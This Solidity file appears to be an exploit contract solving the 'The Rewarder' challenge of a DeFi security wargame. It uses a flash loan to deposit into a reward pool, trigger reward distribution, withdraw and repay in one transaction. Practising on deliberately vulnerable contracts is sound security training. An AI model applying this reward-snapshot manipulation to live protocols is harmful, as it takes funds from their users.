// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 *
 */
contract ReceiverFlashLoan {
    using Address for address payable;

    DamnValuableToken public immutable liquidityToken;

    FlashLoanerPool private immutable pool;
    TheRewarderPool private immutable theRewardPool;
    address private immutable owner;

    constructor(address poolAddress, address _theRewardPool, address liquidityTokenAddress) {
        pool = FlashLoanerPool(poolAddress);
        theRewardPool = TheRewarderPool(_theRewardPool);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external payable {
        require(msg.sender == address(pool), "Sender must be pool");
        // do something
        liquidityToken.approve(address(theRewardPool), amount);
        theRewardPool.deposit(amount);
        theRewardPool.distributeRewards();
        theRewardPool.withdraw(amount);

        // pay back
        liquidityToken.transfer(msg.sender, amount);
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        require(theRewardPool.isNewRewardsRound(), "none chance");
        pool.flashLoan(amount);
    }

    //function fallback() external payable{}
    receive() external payable {}
}
